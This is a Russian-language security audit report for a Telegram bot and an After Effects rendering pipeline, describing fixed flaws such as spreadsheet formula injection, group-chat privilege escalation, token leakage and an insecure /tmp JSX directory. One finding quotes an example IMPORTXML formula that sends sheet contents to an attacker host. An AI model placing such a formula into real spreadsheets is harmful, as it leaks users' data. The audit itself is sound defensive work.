# Аудит безопасности и надёжности — TS26

Проекты: `tg-pushes-TS26` (Telegram-бот, очередь рендера, AE worker) и `sheet2comp-ae`
(извлечение данных, загрузчики, ExtendScript для After Effects).

Дата: 29.07.2026 · Проверено ~6 000 строк Python в первом проекте и ~10 000 строк
Python/JSX во втором · Тесты: 116 проходят (82 существующих + 34 новых).

---

## Критические уязвимости

### 1. Formula injection в Google Sheets — исправлено

Форма плашек писала имя и должность пользователя в таблицу с
`valueInputOption="USER_ENTERED"`. Google Sheets исполняет содержимое ячейки,
начинающееся с `=`, `+`, `-` или `@`. Любой пользователь с доступом к форме мог
отправить имя вида

```
=IMPORTXML("https://attacker.example/?d="&CONCATENATE(A1:E300),"//a")
```

и при открытии листа формула выполнилась бы, выгрузив содержимое таблицы на
внешний сервер. Тот же путь существовал в `write_ae_records_to_spreadsheet`, куда
попадают данные из внешнего контент-плана и ответы LLM.

**Исправление:** все записи переведены на `valueInputOption="RAW"`; добавлена
функция `sheet_safe_text()`, которая экранирует опасный префикс апострофом
(защита в глубину — на случай, если ячейку скопируют в другой инструмент).
Значения по умолчанию у `GoogleRestWorksheet.update/batch_update` тоже изменены на
`RAW`, чтобы новый вызывающий код не унаследовал небезопасное поведение.

### 2. Эскалация прав в групповых чатах — исправлено

Авторизация проверяла только `message.chat.id`:

```python
if not is_admin_chat_id(chat_id):   # chat_id = message["chat"]["id"]
```

В личном чате это совпадает с id пользователя, но в группе `chat.id` — это id
**группы**. Если бы в `TELEGRAM_ADMIN_CHAT_IDS`/`TELEGRAM_CHAT_ID` попал id группы
(обычный сценарий для рабочих чатов), **любой участник этой группы** получил бы
права администратора: `/ae_rebuild`, `/add_plaque_user`, доступ ко всем отчётам.
Сейчас конфигурация использует личный чат, поэтому уязвимость была латентной, но
срабатывала бы при первом же добавлении бота в группу.

**Исправление:** добавлены `actor_ids()` и `is_authorized_actor()`. В группах
теперь требуется, чтобы в allow-list был **и чат, и конкретный отправитель**
(`callback.from.id` / `message.from.id`). Применено ко всем четырём обработчикам:
админ-команды, админ-callback, форма плашек и её callback.

### 3. Токен trigger-сервера утекал в `ps` и в plist с правами 644 — исправлено

`install_ae_render_trigger_server_macos.command` подставлял токен в
`ProgramArguments` launchd-плиста и делал `chmod 644`. Следствия:

* токен был виден **любому локальному пользователю** через `ps aux`;
* `~/Library/LaunchAgents/*.plist` был доступен на чтение всем;
* при пустом `AE_RENDER_TRIGGER_TOKEN` в плист попадало `--token ""` — сервер
  запускался **вообще без аутентификации**.

**Исправление:** токен перенесён в `EnvironmentVariables`, плист создаётся сразу с
правами `600`, токен сохраняется в `~/Documents/tg_sheet_monitor/ae_render_trigger.token`
(права `600`) и переиспользуется при переустановке. Если токен не задан — он
**генерируется** через `secrets.token_urlsafe(32)`, а не остаётся пустым.

### 4. Незащищённый HTTP-эндпоинт рендера — исправлено

`ae_render_trigger_server.py` содержал несколько проблем сразу:

| Проблема | Было | Стало |
|---|---|---|
| Пустой токен = доступ всем | `if not token: return True` | отказ стартовать на не-loopback без токена |
| Сравнение токена | `==` (утечка по времени) | `hmac.compare_digest` |
| Размер тела запроса | `self.rfile.read(length)` без границ | лимит 64 КБ, проверка до чтения |
| Внутренние ошибки | `str(exc)` уходил клиенту | 500 + generic, детали только в лог |
| Длина полей | не проверялась | 500 символов на `name`/`position` |
| Порядок проверок | состояние AE проверялось раньше валидации | сначала валидация запроса |

Последний пункт — заодно UX: на некорректный запрос сервер отвечал «Откройте
проект в After Effects» вместо описания реальной ошибки.

### 5. Небезопасный каталог в `/tmp`, из которого AE исполняет JSX — исправлено

`temp_project_dir` по умолчанию `/private/tmp/ts26-ae-render`. Worker создавал там
каталоги через `mkdir(exist_ok=True)` с правами по umask и писал туда `.jsx`,
которые затем **исполняет After Effects**. В общем `/tmp` другой локальный
пользователь мог заранее создать этот каталог или подменить файл симлинком и
добиться исполнения своего кода внутри AE от имени владельца сессии.

**Исправление:** добавлена `secure_workdir()` — создаёт каталог с правами `0700`,
отказывается работать с симлинком и с каталогом, принадлежащим другому uid,
чинит group/other-writable права. Применена ко всем трём точкам
(`_busy_check`, `_project_check`, каталог задания). Дополнительно `job["id"]`
валидируется регулярным выражением, а `cleanup_job_dir` проверяет, что
`rmtree` вызывается строго внутри `temp_project_dir`.

## Ошибки поведения

### 6. Двойной ответ бота на админ-команды — исправлено

В `poll_admin_updates` оба обработчика вызывались всегда:

```python
changed = handle_admin_message(...) or changed
changed = handle_plaque_message(...) or changed
```

Админ, отправивший `/status`, получал отчёт **и** сообщение «команда не нужна».
Заменено на `if ... elif ...`: обработчики игнорируют чужие namespace
(`dbg:` / `plq:`), поэтому короткое замыкание безопасно.

### 7. `AE_READY_SPREADSHEET_ID` со ссылкой ломал синхронизацию — исправлено

В `.env` и `ae_render_config.json` этот параметр заполнен **полным URL**, а
`tg_sheet_monitor.ae_ready_spreadsheet_id()` возвращал строку как есть и передавал
её в `open_by_key()`. `ae_sheet_source.py` при этом URL корректно разбирал — то
есть две половины системы работали с разными представлениями одной таблицы.
Добавлена `spreadsheet_id_from_value()`: принимает и ID, и ссылку, а на
неразбираемый URL кидает понятную ошибку вместо тихого сбоя.

### 8. Пакетная отправка плашек теряла результат — исправлено

`confirm_plaque` писал строки в цикле без обработки ошибок. Сбой на 7-й строке
выбрасывал исключение, и пользователь видел только текст ошибки — при том что
строки 1–6 уже были записаны в таблицу. Естественная реакция — отправить всё
заново, получив дубликаты. Теперь каждая строка изолирована, а в отчёте (и
пользователю, и админу) отдельно перечислены записанные и незаписанные плашки.

### 9. Падение бота от одной ошибки — исправлено

Главный цикл не имел защиты: `ConfigError` из `notify()` (например, протухший
Google-токен или пустой список получателей) завершал процесс, и уведомления
молча прекращались. Добавлены `guarded()`/`run_step()` — каждый шаг цикла логирует
ошибку и продолжает работу, плюс экспоненциальный backoff (5→300 с) при серии
падений. Аналогично в `poll_admin_updates` одно некорректное обновление больше не
прерывает обработку остальных.

### 10. Неограниченный рост очереди рендера — исправлено

`data["jobs"].append(...)` без очистки; файл уже вырос до 78 КБ и **полностью
перечитывался и перезаписывался при каждом enqueue и каждом запросе статуса**.
Добавлена `prune_terminal_jobs()`: хранит 500 последних завершённых заданий,
активные не трогает никогда.

### 11. Невозможно повторить упавший рендер — исправлено аккуратно

Дедупликация по `source_key` включала статус `error`, поэтому повторная отправка
той же плашки после сбоя молча возвращала старое задание — с точки зрения
пользователя «ничего не произошло».

Простое удаление `error` из дедупликации сломало бы другое: поллер листа
пересоздавал бы сломанный рендер каждую минуту. Поэтому введён отдельный набор
`USER_RETRY_DEDUPE_STATUSES` (без `error`), который используется **только** на
путях явного действия человека — подтверждение в боте и HTTP-триггер. Поллер
листа продолжает использовать строгий набор по умолчанию.

### 12. Молчание в ответ на команду — исправлено

Пользователь без прав, отправивший любую команду, не получал **ничего** — бот
выглядел сломанным. Теперь приходит короткое объяснение и подсказка про `/start`.

## Прочие исправления

**tg-pushes-TS26**

* `save_state()` — атомарная запись с `fsync` и правами `0600` (файл содержит
  chat_id, ФИО спикеров и кэш таблиц; раньше создавался по umask, обычно `0644`).
* Dockerfile — контейнер больше не работает от root: добавлен `appuser` (uid 10001).
  Также выставлен `TS26_SKIP_DEPENDENCY_BOOTSTRAP=1`: зависимости уже установлены
  на этапе сборки, а runtime-`pip install` в проде — плохая практика.
* `parse_plaque_batch` — лимит в 50 строк проверяется **до** валидации, чтобы на
  большой вставке приходило сообщение о размере, а не жалоба на конкретную строку.
* Логи админ-команд больше не содержат полный текст сообщения (мог включать
  chat_id и аргументы) — только имя команды.

**sheet2comp-ae**

* `download_person_plate_data.request_bytes` — лимит 64 МБ. URL берутся из ячеек
  таблицы; ошибочная ссылка на большой файл раньше буферизовалась в память целиком.
* `yandex_disk_links_from_names.py` — `--token` помечен как нерекомендуемый и
  печатает предупреждение: аргументы командной строки видны всем в `ps` и
  оседают в истории shell. `tools_gui.py` уже передаёт токен через окружение —
  это правильный путь, он не менялся.
* `.gitignore` — добавлены `.env`, `*.token`, `client_secret*.json`,
  `google_oauth_user.json`, `service_account*.json`, `.DS_Store` и генерируемые
  выгрузки. В репозитории секретов не обнаружено, правило добавлено превентивно.

## Проверено и признано корректным

Чтобы было видно границы аудита:

* **Экранирование HTML в Telegram.** Весь текст из таблиц и от LLM проходит через
  `h()` перед отправкой в режиме `parse_mode=HTML`; инъекция разметки невозможна.
  Покрыто тестами.
* **Атомарность записи очереди и реестра.** `flock` + `mkstemp` + `os.replace`
  реализованы правильно, права исходного файла сохраняются.
* **Подстановка путей в JSX.** Шаблоны подставляют пути через `json.dumps()` —
  корректное экранирование, инъекция в ExtendScript невозможна.
* **`subprocess`.** Нигде нет `shell=True`; все вызовы используют списки аргументов.
* **`safe_file_name()`** в worker — обход каталога через имя плашки не проходит.
* **Секреты в git.** Ни `.env`, ни OAuth-файлы не отслеживаются; на диске права `600`.
* **Запрет запуска worker от root** (`os.geteuid()`) — уже был, оставлен.

## Что стоит сделать дальше (не менял)

1. **Ротация OAuth-креденшелов.** `google_oauth_user.json` содержит рабочий
   refresh-токен, `client_secret_*.json` — client secret. Они не в git и с правами
   600, но если этот каталог когда-либо копировался или лежал в общей папке —
   токен стоит перевыпустить в Google Cloud Console.
2. **Долгий polling Telegram.** Сейчас `getUpdates` с `timeout: 0` вызывается раз
   в 5 секунд — это ~17 000 запросов в сутки. `timeout=25` (long polling) снизит
   и нагрузку, и задержку отклика бота.
3. **`ae_sheet_source.py` жёстко требует `gspread`** на уровне импорта, из-за чего
   `ae_render_worker` и trigger-сервер не стартуют без него — при том что в
   `tg_sheet_monitor` есть аккуратный stdlib-fallback. Стоит выровнять.
4. **Тесты в CI.** Файлы в `tests/` рассчитаны на `pytest` (не все добавляют
   корень в `sys.path`), хотя написаны на `unittest`. Стоит добавить
   `conftest.py` или `pytest.ini`, чтобы `python -m unittest discover` тоже работал.
